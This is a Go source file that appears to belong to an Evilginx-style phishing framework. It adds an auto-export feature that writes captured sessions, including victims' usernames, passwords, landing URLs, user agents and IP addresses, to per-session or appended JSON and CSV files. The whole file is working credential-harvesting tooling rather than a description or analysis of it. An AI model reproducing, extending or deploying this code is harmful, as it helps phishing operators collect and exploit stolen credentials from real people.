package core

import (
    "encoding/csv"
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "sync"
    "time"
)

// AutoExportConfig holds configuration for automatic session export
type AutoExportConfig struct {
    Enabled  bool   `json:"enabled"`
    Format   string `json:"format"` // "json" or "csv"
    Path     string `json:"path"`
    PerFile  bool   `json:"per_file"` // true = one file per session, false = append to one file
}

var (
    autoExportCfg  *AutoExportConfig
    autoExportOnce sync.Once
    autoExportMu   sync.Mutex
)

// GetAutoExportConfig returns the singleton auto-export config
func GetAutoExportConfig() *AutoExportConfig {
    autoExportOnce.Do(func() {
        autoExportCfg = &AutoExportConfig{
            Enabled: false,
            Format:  "json",
            Path:    filepath.Join(os.TempDir(), "evilginx_exports"),
            PerFile: true,
        }
    })
    return autoExportCfg
}

// SetAutoExportConfig sets the auto-export configuration
func SetAutoExportConfig(cfg *AutoExportConfig) {
    autoExportMu.Lock()
    defer autoExportMu.Unlock()
    autoExportCfg = cfg
}

// AutoExportSession exports a session to a file automatically
func AutoExportSession(session TSession) error {
    cfg := GetAutoExportConfig()
    if !cfg.Enabled {
        return nil
    }

    autoExportMu.Lock()
    defer autoExportMu.Unlock()

    // Create export directory if it doesn't exist
    if err := os.MkdirAll(cfg.Path, 0700); err != nil {
        return fmt.Errorf("autoexport: failed to create directory: %v", err)
    }

    timestamp := time.Now().Format("20060102_150405")
    phishlet := session.Phishlet
    if phishlet == "" {
        phishlet = "unknown"
    }

    switch cfg.Format {
    case "json":
        var filename string
        if cfg.PerFile {
            filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_%s_%d.json", phishlet, timestamp, session.ID))
        } else {
            filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_exports.json", phishlet))
        }

        if cfg.PerFile {
            data, err := json.MarshalIndent(session, "", "  ")
            if err != nil {
                return fmt.Errorf("autoexport: failed to marshal session: %v", err)
            }
            if err := os.WriteFile(filename, data, 0600); err != nil {
                return fmt.Errorf("autoexport: failed to write file: %v", err)
            }
        } else {
            // Append to a JSON array
            var sessions []TSession
            if existing, err := os.ReadFile(filename); err == nil {
                json.Unmarshal(existing, &sessions)
            }
            sessions = append(sessions, session)
            data, _ := json.MarshalIndent(sessions, "", "  ")
            os.WriteFile(filename, data, 0600)
        }
        log.Info("autoexport: exported session #%d to %s", session.ID, filename)

    case "csv":
        var filename string
        if cfg.PerFile {
            filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_%s_%d.csv", phishlet, timestamp, session.ID))
        } else {
            filename = filepath.Join(cfg.Path, "sessions_export.csv")
        }

        file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
        if err != nil {
            return fmt.Errorf("autoexport: failed to open file: %v", err)
        }
        defer file.Close()

        writer := csv.NewWriter(file)
        defer writer.Flush()

        // Write header if file is new
        stat, _ := file.Stat()
        if stat.Size() == 0 {
            writer.Write([]string{"ID", "Phishlet", "Username", "Password", "LandingURL", "UserAgent", "RemoteAddr", "CreateTime", "UpdateTime"})
        }

        writer.Write([]string{
            fmt.Sprintf("%d", session.ID),
            session.Phishlet,
            session.Username,
            session.Password,
            session.LandingURL,
            session.UserAgent,
            session.RemoteAddr,
            fmt.Sprintf("%d", session.CreateTime),
            fmt.Sprintf("%d", session.UpdateTime),
        })
        log.Info("autoexport: exported session #%d to %s", session.ID, filename)
    }

    return nil
}
